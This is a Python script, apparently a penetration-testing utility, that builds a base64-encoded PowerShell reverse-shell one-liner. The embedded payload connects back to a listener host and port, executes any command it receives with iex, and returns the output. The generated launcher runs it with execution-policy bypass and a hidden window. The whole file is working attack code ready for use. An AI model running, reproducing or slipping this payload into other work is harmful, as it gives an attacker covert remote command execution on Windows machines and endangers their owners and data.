#!/usr/bin/env python3

"""
Script to generate a base64-encoded powershell payload of a one-liner reverse shell.
"""

import argparse
import base64
import fcntl
import socket
import struct
import sys
from ipaddress import ip_address

LPORT = 443

payload_template = """\
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
"""
caller_template = "powershell -nop -noni -ep bypass -w hidden -e {payload}"


# source: https://stackoverflow.com/a/24196955/5202294
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack("256s", ifname[:15].encode())
    )[20:24])


def portnum(p):
    p = int(p)
    if p > 65535:
        raise argparse.ArgumentTypeError("port number must be <= 65535")
    if p < 1:
        raise argparse.ArgumentTypeError("port number must be > 0")
    return p


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
                    prog='mkpsrev',
                    description='Creates a base64-encoded powershell one-liner reverse shell.')
    parser.add_argument('-i', '--lhost', type=ip_address, default=get_ip_address("tun0"), help="LHOST, IP address for reverse shell listener.")
    parser.add_argument('-p', '--lport', type=portnum, default=LPORT, help="LPORT for reverse shell listener.")
    args = parser.parse_args()

    payload = payload_template.format(lhost=args.lhost,lport=args.lport)
    print("[*] base64-encoded payload:", file=sys.stderr)
    print(f"[*] {payload}", file=sys.stderr)
    payload = base64.b64encode(payload.encode("utf-16le")).decode()
    caller = caller_template.format(payload=payload)
    print(caller)

